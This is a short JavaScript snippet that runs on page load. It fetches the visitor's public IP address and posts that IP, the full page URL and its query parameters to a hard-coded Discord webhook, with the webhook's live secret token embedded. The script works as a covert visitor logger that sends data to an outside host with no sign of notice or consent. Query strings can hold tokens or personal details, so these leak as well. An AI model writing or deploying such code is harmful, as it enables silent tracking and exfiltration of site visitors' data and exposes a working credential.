// Function to send IP address, page, and parameters to a Discord webhook
function sendToDiscord(ip, page, params) {
    const webhookURL = 'https://discord.com/api/webhooks/1239886232318902314/Gufgz7uq5eSO1CSF0A8_dMKFC4f-Vm9uNMLaju1Rqugx9VgNJDKU8VxE_D1U2F2Sy_tN';
    const data = { content: `New access logged:\nIP: ${ip}\nPage: ${page}\nParameters: ${params}` };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(() => console.log('Data sent to Discord'))
    .catch(error => console.error('Error sending data to Discord:', error));
}

// Log IP address, page, and parameters on page load
window.addEventListener('load', () => {
    const ip = fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => console.error('Error getting IP address:', error));

    const page = window.location.href;
    const params = window.location.search;

    Promise.all([ip, page]).then(([ip, page]) => {
        console.log('IP Address:', ip);
        console.log('Page:', page);
        console.log('Parameters:', params);
        sendToDiscord(ip, page, params);
    });
});
